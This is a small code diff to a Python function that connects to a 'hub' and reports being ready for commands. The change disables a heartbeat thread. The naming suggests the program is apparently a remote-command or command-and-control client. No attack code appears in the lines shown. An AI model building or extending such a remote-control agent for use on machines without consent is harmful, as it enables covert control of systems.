@@ -1141,8 +1141,8 @@ def connect_to_hub(hub_ip, port, github_throne_url=DEFAULT_GITHUB_THRONE_URL):
                 continue
             
             print("[+] Connection Established - Ready for commands!")
-            # Start heartbeat thread
-            threading.Thread(target=send_heartbeat, args=(client,), daemon=True).start()
+            # Start heartbeat thread - disabled, hub pings us
+            # threading.Thread(target=send_heartbeat, args=(client,), daemon=True).start()
 
             while True:
                 try:
